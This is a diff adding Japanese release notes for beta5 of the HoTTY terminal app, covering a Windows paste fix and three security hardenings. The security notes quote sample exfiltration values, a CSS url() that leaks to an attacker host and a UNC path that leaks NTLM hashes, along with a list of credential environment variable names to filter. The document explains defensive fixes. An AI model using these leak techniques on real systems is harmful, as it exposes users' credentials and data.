@@ -1,5 +1,19 @@
 # リリースノート
 
+## v2.0.3-beta5
+
+不具合修正とセキュリティハードニングを中心としたリリースです。目玉の変更は **Windows でのペースト不具合**の修正で、複数行を貼り付けると 1 行ごとに余分な空行が挟まる長年の問題を解消しました — Windows クリップボードの CRLF が改行正規化なしでリモートシェルへ送られていたことが原因です。あわせて、レンダラー / インポートされたカスタムテーマ JSON / `gcloud` ・ `wsl.exe` ・ローカルシェルの子プロセスへの環境変数継承の 3 経路で、いずれも防御的多層化 (実用上の悪用報告は無し) のセキュリティハードニングを 3 件入れています。
+
+### バグ修正
+
+- **ペースト時に行間に空行が入る不具合を修正しました。** Windows のシステムクリップボードは改行を CRLF (`\r\n`) で保持します。HoTTY ではペースト確認モーダルで OK を押した際にクリップボードのバイト列をそのままリモートシェルへ転送していたため、シェル側で `\r` を Enter (行を実行) として処理した後、続く `\n` をリテラルの改行としてエコーし、貼り付けた各行の下に空行が 1 行ずつ挿入される現象が発生していました。本リリースでは送信前に `\r\n` および裸の `\n` を単独の `\r` へ正規化するようにし (xterm.js 本体の `prepareTextForTerminal()` と同じ挙動)、10 行のスニペットが 19 行ではなく 10 行として貼り付けられるようになりました。`\r` 単独はそのまま温存します。HoTTY は xterm.js 組み込みのペーストハンドラを意図的に抑制してペースト確認モーダルを挟む構造になっているため、その抑制で同時に失われていた正規化ステップを復元する修正です。
+
+### セキュリティ
+
+- **カスタムテーマ JSON の値に対する CSS インジェクション / 外部リソース取得の経路を塞ぎました。** `save_custom_theme` Tauri コマンドは従来、テーマ変数値の長さ (≤500 文字) のみを検証していました。`%APPDATA%/com.hotty.terminal/themes/` に取り込まれた悪意あるテーマ JSON が変数値に `url("https://attacker/x?leak=…")` のような文字列を入れ、フロントエンドがその変数をスタイルルール (`background-image: var(--bg-primary)`) で使用した時点でブラウザが当該 URL を fetch してリクエストサイドチャネル経由で情報を流出させる経路が成立しうる状態でした。バックエンドは今後、テーマ値が `url(`、`;`、`{`、`}`、`<`、`>`、改行のいずれかを含む場合は拒否します。同じ検証はターミナル 4 色 (foreground / background / backgroundInactive / paneBackground) にも適用されます。なお、フロントエンド側の `setProperty('--name', value)` 経路は元々構造的に破壊された値を破棄するため、key 側の経路は最初から成立していませんでした — 本修正は value 側を閉じるものです。
+- **SSH / Jumpbox の秘密鍵パスとして UNC / ネットワークパスを拒否するようになりました。** レンダラーから渡された `private_key_path` に `\\attacker\share\probe` のような UNC を指定すると、`russh::keys::load_secret_key()` がそのパスへ SMB 読み取りを発行し、Windows では NTLMv2 ハッシュが攻撃者制御のサーバへ流出して NTLM relay に転用可能な状態でした。`services::ssh::try_authenticate()` と `services::jumpbox::authenticate_jumpbox()` の両方で、`load_secret_key` 呼び出し前に `\\…` / `//…` / Win32 verbatim-UNC `\\?\UNC\…` 形式を拒否し、認証失敗トーストに `Private key path cannot be a UNC/network path` (Jumpbox の場合は `Jumpbox: …`) を表示します。UNC 上にキーを置いて運用していた場合はローカルへコピーしてください — Windows でのセキュリティ便益がエッジケースを上回ると判断しています。
+- **`gcloud` / `wsl.exe` / ローカルシェルへ継承する環境変数のクレデンシャルフィルタを拡張しました。** 子プロセス (`gcloud`、`wsl.exe`、ローカルシェル) へ親プロセスの環境変数を継承する前にフィルタするパターンリストに、これまでの `API_KEY` / `SECRET` / `TOKEN` / `PASSWORD` / `PASSWD` / `CREDENTIAL` / `PRIVATE_KEY` / `ACCESS_KEY` に加えて、`AUTH` (これにより `SSH_AUTH_SOCK` が確実にフィルタされます — `wsl.exe` に継承されるとホスト側 SSH エージェントへの WSL からのアクセスを許してしまうため重要) 、`SESSION` (1Password の `OP_SESSION_*` などのセッションポインタ) 、`PASSPHRASE`、明示的な変数名として `AWS_PROFILE` と `KUBECONFIG` (これらはディスク上のクレデンシャルファイルへのポインタ) を追加しました。`gcloud_iap.rs` / `local.rs` / `wsl.rs` の 3 ファイルにあった同一のフィルタ実装は共通ヘルパーに統合され、今後の追加は 1 か所だけ行えば 3 経路すべてに反映されます。
+
 ## v2.0.3-beta4
 
 仕上げと不具合修正にフォーカスしたリリースです。目玉の変更は **SSH / Telnet / Jumpbox の接続失敗メッセージ** で、ライブラリ生エラー (`connection failed: example.com:22: failed to lookup address information: ...`) を短く分かりやすい英語ラベル (`Host not found`、`Wrong passphrase for private key`、`Jumpbox: Connection refused`、…) に置き換えました。**GCP Instances ペイン** には IAP トンネル権限を持たない VM を非表示にする IAM 連動フィルタを追加しています。あわせて、beta2 / beta3 で一部ユーザーが遭遇していた OS Login メタデータプローブの回帰 (`gcloud` projection に埋め込まれた `"` が `cmd.exe` のクォート処理を破壊し、`'C:\…\Google\Cloud' is not recognized` で失敗) を修正し、同じプローブが組織レベル OS Login の強制も正しく扱うようになりました。
